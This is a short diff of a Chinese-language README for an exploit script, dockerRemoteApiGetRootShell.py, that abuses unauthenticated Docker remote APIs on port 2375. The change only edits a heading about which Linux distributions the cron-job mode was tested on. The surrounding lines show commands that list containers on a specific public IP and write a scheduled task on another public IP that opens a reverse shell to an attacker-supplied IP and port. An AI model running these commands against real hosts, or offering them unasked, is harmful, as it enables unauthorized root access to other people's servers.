@@ -21,7 +21,7 @@ docker 未授权访问漏洞利用脚本
 
     python dockerRemoteApiGetRootShell.py -h 139.217.25.172 -p 2375 -L
 
-##写计划任务（测试centos;ubuntu可能需要自己修改计划任务路径）
+##写计划任务（测试centos,redhat）
 
     python dockerRemoteApiGetRootShell.py -h 158.85.173.113 -p 2375 -C -i 镜像名 -H 反弹ip -P 反弹端口
 
